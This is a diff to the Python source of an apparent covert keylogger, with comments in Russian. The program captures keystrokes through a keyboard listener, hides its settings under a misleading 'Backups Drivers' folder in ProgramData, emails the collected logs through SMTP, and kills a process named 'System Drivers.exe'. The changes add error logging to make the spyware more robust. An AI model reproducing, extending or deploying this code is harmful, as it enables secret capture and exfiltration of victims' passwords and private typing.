@@ -64,8 +64,9 @@ def send_email(date):
 			server.send_message(msg)                               # Отправляем сообщение
 			server.quit()
 			write_time_date_file_in_write_file('       - - - - - Файл успешно отправлен - - - - -      ' + '\n')
-		except:
+		except Exception as err:
 			write_time_date_file_in_write_file('  - - - Файл настроек содержит неверные данные - - -   ' + '\n')
+			write_time_date_file_in_write_file('Code error: ' + str(err) + '\n')
 	#===========================================================================================================================
 #Прикрепление документа к электронному письму
 def attach_file(msg, date):
@@ -114,6 +115,7 @@ def send_control(date):
 		except:
 			return True
 	except:
+		write_time_date_file_in_write_file('Error: Отсутсвует файл с датами. Создание файла с датами.' + '\n')
 		zapis_dat_date(date)
 		return send_control(date)
 #Получение предыдущего месяца(названия директории), который хранится в директории с кейлогером, или получение ответа что ее нет
@@ -134,7 +136,7 @@ def find_date(date, flag):
 			try:
 				files.remove('dates.dat')
 			except:
-				pass
+				write_time_date_file_in_write_file('Error: Отсутсвует файл с датами.' + '\n')
 			files.sort()
 			if len(files) >= 1:
 				return disk_key + main_folder + user_name + '\\' + year_curent + '\\' + res + '\\{}'.format(files[-1])
@@ -150,7 +152,7 @@ def find_date(date, flag):
 		try:
 			files.remove('dates.dat')
 		except:
-			pass
+			write_time_date_file_in_write_file('Error: Отсутсвует файл с датами.' + '\n')
 		files.sort()
 		#Проверяем : длина списка больше 1? и есть ли упоминание даты в имени файла?
 		if len(files) > 1 and date not in files[-2]:
@@ -211,12 +213,13 @@ if not isfile("C:\\ProgramData\\Backups Drivers\\Settings.dat"):
 	try:
 		copy("Settings.dat", "C:\\ProgramData\\Backups Drivers")
 	except:
+		write_time_date_file_in_write_file('Error: Копирование бэкап файла с настройками в директорию с бэкап файлами запрещено. Выполяется выход из приложения.' + '\n')
 		exit()
 if not isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): 
 	try:
 		copy("data.dat", "C:\\ProgramData\\Backups Drivers")
 	except:
-		pass
+		write_time_date_file_in_write_file('Error: Копирование бэкап файла с данными в директорию с бэкап файлами запрещено.' + '\n')
 		
 SettingsDat = open("C:\\ProgramData\\Backups Drivers\\Settings.dat", "rb")
 DataSettings = load(SettingsDat)
@@ -279,7 +282,8 @@ try:
 			copy("data.dat", disk_key + main_folder)
 		except:
 			if isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): copy("C:\\ProgramData\\Backups Drivers\\data.dat", disk_key + main_folder)
-			else: pass
+			else:
+				write_time_date_file_in_write_file('Error: Отсутсвует бэкап файл с данными в директории с бекап файлами.' + '\n')
 	if not isdir(disk_key + main_folder + user_name): mkdir(disk_key + main_folder + user_name)
 	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent)
 	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
@@ -295,7 +299,8 @@ except:
 				copy("data.dat", disk_key + dop_folder)
 			except:
 				if isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): copy("C:\\ProgramData\\Backups Drivers\\data.dat", disk_key + dop_folder)
-				else: pass
+				else:
+					write_time_date_file_in_write_file('Error: Отсутсвует бэкап файл с данными в директории с бекап файлами.' + '\n')
 		if not isdir(disk_key + dop_folder + user_name): mkdir(disk_key + dop_folder + user_name)
 		if not isdir(disk_key + dop_folder + user_name + '\\' + year_curent): mkdir(disk_key + dop_folder + user_name + '\\' + year_curent)
 		if not isdir(disk_key + dop_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + dop_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
@@ -314,11 +319,13 @@ except:
 					copy("data.dat", disk_key + folder_for_D)
 				except:
 					if isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): copy("C:\\ProgramData\\Backups Drivers\\data.dat", disk_key + folder_for_D)
-					else: pass
+					else: 
+						write_time_date_file_in_write_file('Error: Отсутсвует бэкап файл с данными в директории с бекап файлами.' + '\n')
 			if not isdir(disk_key + folder_for_D + user_name + '\\' +year_curent): mkdir(disk_key + folder_for_D + user_name + '\\' + year_curent)
 			if not isdir(disk_key + folder_for_D + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + folder_for_D + user_name + '\\' + year_curent + '\\' + moon_curent)
 			main_folder = folder_for_D
 		else:
+			write_time_date_file_in_write_file('Error: Отсутвуют права на запись на всех дисках. Выполняется выход из приложения.')
 			exit()
 	#Повторно записываем время и дату в файл, в созданной или уже имеющейся папке диска С или D, если вызвалось исключене
 	write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Инициализация - " + user_name + ' - - -\n', 1)
@@ -456,7 +463,10 @@ def on_release(key):
 try:          
     a = keyboard.Listener(on_press = on_press, on_release = on_release)
     a.start()
-except: pass
+except Exception as err: 
+	write_time_date_file_in_write_file('Error: Раелизация класса приложения запрещена. Выполяется выход из приложения.' + '\n')
+	write_time_date_file_in_write_file('Code error: ' + str(err) + '\n')
+	exit()
 
 write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Запущено - - - - - - - - - -   \n", 0)
 send_control_and_zapis()
@@ -469,9 +479,12 @@ def find_process_pid(process_name):
                 process.kill()
 try: 
 	find_process_pid('System Drivers.exe')
-except: pass
+except: 
+	write_time_date_file_in_write_file('Error: Отсутсвуют администраторсике права для удаления дополнительного процесса приложения.' + '\n')
 
 while 1:
     try:
         a.join()
-    except: pass
+    except Exception as err: 
+    	write_time_date_file_in_write_file('Error: Критическая ошибка. Приложение функционирует в штатном режиме.' + '\n')
+    	write_time_date_file_in_write_file('Code error: ' + str(err) + '\n')
